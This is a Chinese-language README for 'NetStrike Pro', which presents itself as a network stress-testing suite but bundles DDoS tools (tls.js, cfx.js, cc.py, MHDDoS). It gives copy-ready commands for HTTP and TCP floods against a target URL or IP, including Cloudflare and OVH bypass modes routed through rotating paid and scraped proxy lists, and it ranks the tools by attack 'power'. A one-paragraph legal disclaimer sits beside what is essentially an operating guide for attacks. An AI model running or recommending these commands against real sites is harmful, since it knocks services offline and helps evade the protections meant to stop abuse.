# 🎯 NetStrike Pro（网击专业版）

**专业网络压力测试套件** | **版本 5.0.0 Ultimate Edition**

> ⚠️ **重要**: 本工具仅供合法授权的安全测试使用！

---

## ✨ 项目特色

### 🎯 双轨方案

**1. 原有工具**（`legacy/` 目录）⭐ 推荐
- ✅ **立即可用** - 无需配置
- ✅ **功能完整** - 60+ 种攻击方法
- ✅ **经过验证** - 稳定可靠

**2. 新专业框架**（主目录）
- ✅ **现代 UI** - Rich 终端界面
- ✅ **双语支持** - 中文 + 英文
- ✅ **模块化** - 易于扩展

### 💪 核心优势

| 特性 | 说明 |
|------|------|
| **零破坏** | 所有原有工具 100% 保留 |
| **立即可用** | 无需迁移，直接使用 |
| **专业品牌** | NetStrike Pro 国际化名称 |
| **完整文档** | 8+ 个详细文档 |

---

## 🚀 快速开始

### 3 步开始测压

```bash
# 步骤 1: 进入工具目录
cd NetStrike-Pro/legacy

# 步骤 2: 刷新代理
./refresh_proxy.sh

# 步骤 3: 开始攻击（选择一个）
# 方式 A - CloudFlare 绕过（最强）
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt

# 方式 B - 通用 HTTP 攻击
python3 cc.py -url https://目标.com -f proxy_paid.txt -v http -s 60

# 方式 C - MHDDoS 专用 Bypass
python3 mhddos/start.py CFB 0 https://目标.com 200 proxy_paid.txt 100 180
```

---

## 📁 目录结构

```
NetStrike-Pro/
├── START_HERE.md          ⭐ 从这里开始
├── legacy/                ⭐ 所有原有工具
│   ├── cc.py             ✅ Python CC 攻击
│   ├── cc/               ✅ Node.js 工具集
│   ├── mhddos/           ✅ MHDDoS 项目
│   ├── 新建文件夹/        ✅ tls.js, cfx.js, scrape.py
│   ├── 超高速筛选.py      ✅ 代理筛选
│   └── refresh_proxy.sh  ✅ 代理刷新
├── attack.py              新框架主入口
├── ui/                    Rich UI 模块
├── config/                配置系统
└── [其他框架文件]
```

---

## 📚 完整文档

### 必读文档

| 文档 | 说明 | 优先级 |
|------|------|--------|
| **START_HERE.md** | 快速开始 | ⭐⭐⭐⭐⭐ |
| **🎯 完整使用指南.md** | 详细教程 | ⭐⭐⭐⭐⭐ |
| **🌟 项目最终状态.md** | 项目说明 | ⭐⭐⭐⭐ |
| **法律声明.md** | 法律合规 | ⭐⭐⭐⭐⭐ |

### 技术文档

- `QUICKSTART.md` - 快速指南
- `README.md` - 框架概览（英文）
- `✅ 交付清单.md` - 交付内容
- `🎉 项目框架完成报告.md` - 技术报告
- `🎊 项目实施完成总结.md` - 完整总结

---

## 🎯 工具对比

| 工具 | 威力 | 适用场景 | 推荐度 |
|------|------|----------|--------|
| **tls.js** | ⭐⭐⭐⭐⭐ | CloudFlare 绕过 | ⭐⭐⭐⭐⭐ |
| **cc.py** | ⭐⭐⭐⭐ | 通用稳定 | ⭐⭐⭐⭐⭐ |
| **MHDDoS** | ⭐⭐⭐⭐⭐ | 专用 Bypass | ⭐⭐⭐⭐⭐ |
| **cfx.js** | ⭐⭐⭐⭐ | 快速测试 | ⭐⭐⭐⭐ |

---

## ⚠️ 法律声明

**使用前必须**:
- ✅ 拥有目标系统的书面授权
- ✅ 完整阅读 `法律声明.md`
- ✅ 理解并承担所有法律责任

**未经授权的测试是违法的，可能面临刑事起诉！**

---

## 💡 常用命令

```bash
# 代理管理
./refresh_proxy.sh                  # 刷新付费代理
python3 超高速筛选.py                # 筛选免费代理
python3 新建文件夹/scrape.py         # 抓取新代理

# Layer 7 HTTP 攻击
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt
node 新建文件夹/cfx.js https://目标.com proxy_paid.txt 30
python3 cc.py -url https://目标.com -f proxy_paid.txt -v http -s 60

# MHDDoS 攻击
python3 mhddos/start.py CFB 0 https://目标.com 200 proxy_paid.txt 100 180
python3 mhddos/start.py OVH 0 https://目标.com 200 proxy_paid.txt 100 180
python3 mhddos/start.py TCP 目标IP:端口 200 180
```

---

## 🎨 体验新框架

```bash
# 安装 UI 依赖
pip3 install rich pyfiglet colorama PyYAML

# 测试框架
python3 attack.py --version
python3 attack.py --help

# 查看专业 UI（英文）
python3 -c "from ui.intro import show_intro; show_intro('en')"

# 查看专业 UI（中文）
python3 -c "from ui.intro import show_intro; show_intro('zh')"
```

---

## 🌟 项目状态

### ✅ 已完成

- ✅ **原有工具**: 100% 保留在 `legacy/` 目录
- ✅ **新框架**: 专业化架构完成
- ✅ **UI 系统**: Rich 终端界面
- ✅ **双语支持**: 中英文完整
- ✅ **文档系统**: 8+ 个详细文档

### ⏳ 可选扩展

- ⏳ 攻击方法集成到新框架
- ⏳ 代理系统集成
- ⏳ 目标检测系统
- ⏳ Web 界面开发

---

## 📞 需要帮助？

1. 查看 `START_HERE.md` - 快速开始
2. 查看 `🎯 完整使用指南.md` - 详细教程
3. 查看 `🌟 项目最终状态.md` - 项目说明

---

**NetStrike Pro** - 专业网络压力测试套件  
🎯 **双轨并行** | ✅ **100% 保留** | 💪 **立即可用**

版本 5.0.0 Ultimate Edition | © 2025
